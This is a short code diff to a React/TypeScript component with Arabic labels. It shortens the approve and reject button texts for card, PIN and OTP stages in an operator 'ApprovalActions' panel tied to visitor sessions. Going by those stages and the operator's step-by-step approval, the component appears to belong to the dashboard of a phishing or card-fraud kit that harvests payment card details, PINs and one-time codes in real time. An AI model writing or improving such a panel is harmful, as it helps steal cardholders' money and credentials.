@@ -1270,9 +1270,9 @@ const StageCards = ({ v }: { v: Visitor }) => {
 /* ---------- Approval / Rejection actions ---------- */
 
 const STAGE_LABELS: Record<"card" | "pin" | "otp", { title: string; approve: string; reject: string }> = {
-  card: { title: "إجراء على بطاقة الدفع", approve: "موافقة → الانتقال إلى PIN", reject: "رفض → بيانات البطاقة خاطئة" },
-  pin:  { title: "إجراء على الرقم السري",  approve: "موافقة → الانتقال إلى OTP", reject: "رفض → PIN غير صحيح" },
-  otp:  { title: "إجراء على رمز OTP",      approve: "موافقة → إتمام الدفع",     reject: "رفض → OTP غير صحيح" },
+  card: { title: "إجراء على بطاقة الدفع", approve: "موافق", reject: "رفض" },
+  pin:  { title: "إجراء على الرقم السري",  approve: "موافق", reject: "رفض" },
+  otp:  { title: "إجراء على رمز OTP",      approve: "موافق",     reject: "رفض" },
 };
 
 const ApprovalActions = ({ sessionId, stage }: { sessionId: string; stage: "card" | "pin" | "otp" }) => {
